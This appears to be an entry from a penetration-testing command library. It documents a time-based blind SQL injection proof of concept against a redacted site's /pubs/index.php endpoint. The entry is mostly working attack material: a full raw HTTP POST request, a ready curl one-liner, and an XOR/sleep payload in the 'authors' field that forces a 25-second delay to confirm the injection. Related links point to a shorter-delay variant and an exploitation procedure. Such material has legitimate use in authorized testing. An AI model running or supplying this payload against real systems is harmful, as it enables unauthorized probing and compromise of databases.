---
id: cmd-uuid-poc-25sec
data: >-
  POST /pubs/index.php HTTP/1.1

  Host: ████████

  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101
  Firefox/121.0

  Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate, br

  Content-Type: application/x-www-form-urlencoded

  Content-Length: 68

  Origin: https://████████

  Referer: https://████/pubs/index.php

  Upgrade-Insecure-Requests: 1

  Sec-Fetch-Dest: document

  Sec-Fetch-Mode: navigate

  Sec-Fetch-Site: same-origin

  Sec-Fetch-User: ?1

  Te: trailers

  Connection: close


  years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
tags:
  - sqli
  - poc
  - time-based
type: command
output: HTTP response with ~25 second total time
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.230Z'
verified: false
validated: true
submitted: true
---
# poc-time-based-sqli-25sec-delay

## Command

```bash
POST /pubs/index.php HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://████████
Referer: https://████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

## Description

This command sends a POST request with an extended time-based blind SQL injection payload in the 'authors' parameter, causing a 25-second sleep to confirm vulnerability robustness. Ideal for validation after initial shorter tests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| years | Year filter value (e.g., 2017) | Yes |
| authors | Extended injection payload | Yes |
| Host | Target hostname (redacted) | Yes |
| User-Agent | Browser simulation | Yes |

## Examples

### Basic Usage

Use curl to replicate:
```bash
curl -X POST https://target/pubs/index.php -H "Content-Type: application/x-www-form-urlencoded" -d "years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'" -w "%{time_total}\n"
```

### Advanced Usage

With timeout to handle long delays:
```bash
curl ... --max-time 30
```

## Expected Output

HTTP 200 response with HTML content, but total execution time of ~25 seconds due to sleep(25).

## Related

- [[commands/poc-time-based-sqli-4sec-delay]]
- [[procedures/Exploit-Time-Based-Blind-SQL-Injection]]
